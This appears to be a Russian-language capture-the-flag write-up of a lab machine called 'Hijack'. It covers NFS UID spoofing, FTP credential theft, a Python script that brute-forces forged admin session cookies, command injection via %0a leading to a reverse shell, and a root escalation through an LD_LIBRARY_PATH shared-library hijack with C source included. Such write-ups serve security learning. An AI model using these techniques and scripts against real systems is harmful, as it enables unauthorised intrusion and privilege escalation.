# Hijack

### Необходимые навыки
- Взаимодействие с NFS (Network File System) и анализ конфигурации доступа
- Работа с FTP-сервисами и извлечение данных
- Написание скриптов автоматизации на Python
- Базовое понимание механизмов сессионных cookie и криптографии (Base64, MD5)
- Эскалация привилегий через механизм `LD_LIBRARY_PATH` и переменные окружения (`sudo SETENV`)
- Компиляция динамических библиотек на C (Shared Objects)

---

### Разведка и доступ к системе

Начинаем со сканирования портов для выявления открытых сервисов:

```bash
sudo nmap -sV -sC 10.112.138.240

Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-25 19:36 +0300
Nmap scan report for 10.112.138.240
Host is up (0.16s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
...
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|http-title: Home
111/tcp  open  rpcbind 2-4 (RPC #100000)
...
2049/tcp open  nfs     2-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Анализ веб-сервиса (80 порт)

Параллельно со сканированием запускаем фаззинг директорий (например, через `ffuf` или `gobuster`), но значимых скрытых путей не обнаруживаем.

<img width="761" height="622" alt="image" src="https://github.com/user-attachments/assets/d308331d-4fa5-430b-b7bd-b6b31ac3908d" />

Сайт представляет собой простую платформу с формой авторизации и скрытой панелью администратора (сообщение указывает: `only the admin can access this page`). Стандартные методы, такие как проверка на SQL-инъекцию (через `sqlmap`), анализ запросов в Burp Suite и изучение исходного кода страниц, не дают точки входа.

<img width="761" height="193" alt="image" src="https://github.com/user-attachments/assets/852c4695-6bfa-4597-a369-c9eb8ff42e4c" />

На странице регистрации присутствует логика валидации имени пользователя (Username Enumeration). Однако провести брутфорс паролей через форму авторизации невозможно: установлен жесткий лимит в 5 попыток ввода.

<img width="761" height="259" alt="image" src="https://github.com/user-attachments/assets/fd0132c8-ba96-44cb-abfc-f7e110d12672" />

#### Взаимодействие с NFS (2049 порт)

Возвращаемся к результатам Nmap. Наличие открытого порта `2049` указывает на работу NFS (Network File System). Проверяем экспортированные директории (шары):

```bash
showmount -e 10.112.138.240
```
В выводе видим, что директория `/var/share/mount` доступна всем (`*`). Монтируем ее локально:

```bash
sudo mkdir /tmp/server_files
sudo mount -t nfs 10.112.138.240:/var/share/mount /tmp/server_files
```

Однако при попытке прочитать содержимое примонтированной директории мы получаем ошибку `Permission denied`, даже с правами `root`. Дело в том, что NFS аутентифицирует пользователей по их User ID (UID), а не по имени. Анализ прав доступа показывает, что файлы принадлежат пользователю с `UID 1003`. 
Так как опция `all_squash` в `/etc/exports` на сервере отключена, мы можем обойти ограничение, создав на своей машине локального пользователя с требуемым UID:

```bash
sudo useradd -u 1003 testuser
su - testuser
cd /tmp/server_files
```

Получив доступ к файлам, мы обнаруживаем конфигурационный файл с учетными данными от FTP-сервера.

<img width="761" height="432" alt="image" src="https://github.com/user-attachments/assets/26d9f605-bae1-4c0b-861c-c9790cdbcf59" />

#### Анализ FTP и эксплуатация Cookie

Подключаемся к FTP-серверу по найденным учетным данным и скачиваем все доступные файлы. В архиве находим список из 150 потенциальных паролей и текстовое сообщение от администратора.

<img width="761" height="200" alt="image" src="https://github.com/user-attachments/assets/2bcd5238-283e-4e1d-aaaf-6ad618c6d2e6" />

Так как брутфорс через веб-форму заблокирован лимитом, а попытки XXE-инъекций фильтруются, ищем другой вектор.
Авторизовавшись в системе под свежезарегистрированным аккаунтом (guest), изучаем сессионную cookie:

<img width="287" height="255" alt="image" src="https://github.com/user-attachments/assets/8d4e4304-f812-46e8-bbd7-a784f0bbd5a3" />

Формат cookie выглядит как строка в кодировке Base64. Декодируем ее:
```bash
echo "YWRtaW4621232f297a57a5a743894a0e4a801fc3" | base64 -d
```
Результат раскрывает логику ее формирования: `username:md5(password)`.

Это критическая уязвимость реализации сессий (Insecure Session Management / Cookie Forgery). Вместо брутфорса формы мы можем напрямую подделывать сессионные cookie для пользователя `admin`, используя пароли из найденного списка. Лимита на количество отправляемых cookie нет.

Пишем скрипт на Python для автоматизации перебора:

```python
import requests
import base64
import hashlib
import time
from urllib.parse import quote

def md5(s):
    return hashlib.md5(s.encode()).hexdigest()

def brute_force(url, username, password_list):
    headers = {"User-Agent": "Mozilla/5.0"}
    
    for pwd in password_list:
        pwd_md5 = md5(pwd)
        auth_str = f"{username}:{pwd_md5}"
        b64 = base64.b64encode(auth_str.encode()).decode()
        cookie_val = quote(b64)
        cookies = {"PHPSESSID": cookie_val}

        try:
            resp = requests.get(url, cookies=cookies, headers=headers, timeout=5, allow_redirects=False)
            
            # Успешный вход определяется отсутствием строки "Welcome Guest"
            if "Welcome Guest" not in resp.text:
                print(f"\n[+] ПАРОЛЬ НАЙДЕН: {pwd}")
                print(f"[+] Cookie: {cookie_val}")
                return pwd
        except requests.RequestException as e:
            print(f"Ошибка: {e}")
            break
        
        time.sleep(0.1)
    
    print("[-] Пароль не найден.")
    return None

# Загрузка паролей и запуск
with open("passwords.txt", "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

brute_force("http://10.112.138.240/administration.php", "admin", passwords)
```

Запускаем скрипт, получаем пароль администратора. Входим в панель, где присутствует функционал ввода системных команд. Проверяем на Command Injection.

<img width="761" height="355" alt="image" src="https://github.com/user-attachments/assets/f8d80b59-d692-4e9d-8365-3a2272fbcba8" />

Сервер фильтрует определенные символы, но инъекция отрабатывает с использованием `%0a` (URL-кодированный перевод строки) в качестве разделителя команд. Отправляем Reverse Shell и получаем сессию:

<img width="761" height="212" alt="image" src="https://github.com/user-attachments/assets/d1ef2d72-d692-4a90-a311-3890220a4000" />
<img width="761" height="51" alt="image" src="https://github.com/user-attachments/assets/ca340642-8216-450f-813c-1911b5c50c24" />

---

### Эскалация привилегий (Взятие User)

Мы находимся в системе с правами `www-data` (веб-пользователь). Стандартным шагом в такой ситуации является анализ конфигурационных файлов веб-приложения, так как в них часто хранятся учетные данные для баз данных.

В файле `config.php` мы находим логин и пароль системного пользователя `rick`.
Выполняем переключение:
```bash
su - rick
```
Учетные данные подходят. Забираем первый флаг: `user.txt`.

---

### Эскалация привилегий (Взятие Root)

Проверяем привилегии `sudo` для пользователя `rick`:
```bash
sudo -l
```

<img width="761" height="125" alt="image" src="https://github.com/user-attachments/assets/d13d4018-c57f-46a7-b4fd-c0b337eea362" />

Мы видим, что `rick` может запускать демон Apache (`/usr/sbin/apache2`) от имени `root` без ввода пароля. Критически важная деталь: в правиле присутствует директива `SETENV:`. Это означает, что при выполнении команды `sudo` сохраняются переменные окружения, переданные пользователем.

Злоупотребление переменной `LD_LIBRARY_PATH` (Library Hijacking):
Мы можем передать собственный путь в `LD_LIBRARY_PATH`, заставив динамический линковщик загрузить вредоносную разделяемую библиотеку до загрузки стандартных системных библиотек.

Создаем код на C для нашей библиотеки (`/tmp/library_path.c`):
```c
#include <stdio.h>
#include <stdlib.h>

// Атрибут constructor гарантирует, что функция выполнится сразу при загрузке библиотеки линковщиком
static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH"); // Очищаем переменную во избежание цикличных вызовов
    setresuid(0, 0, 0);          // Устанавливаем реальный, эффективный и сохраненный UID в 0 (root)
    system("/bin/bash -p");      // Запускаем оболочку с сохранением привилегий
}
```

Компилируем код в разделяемую библиотеку (`.so`):
```bash
gcc -fPIC -shared -o /tmp/libcrypt.so.1 /tmp/library_path.c
```
*(Имя `libcrypt.so.1` выбрано специально — это стандартная библиотека, к которой будет обращаться Apache при старте).*

Выполняем разрешенную команду через `sudo`, подставляя наш путь:
```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

Динамический линковщик обращается в `/tmp`, загружает нашу библиотеку `libcrypt.so.1` и выполняет функцию `hijack()` от имени пользователя `root`. Мы получаем root-оболочку.

<img width="761" height="250" alt="image" src="https://github.com/user-attachments/assets/3c0ae962-7f26-4b15-858b-3b81bf748542" />

Машина полностью скомпрометирована.
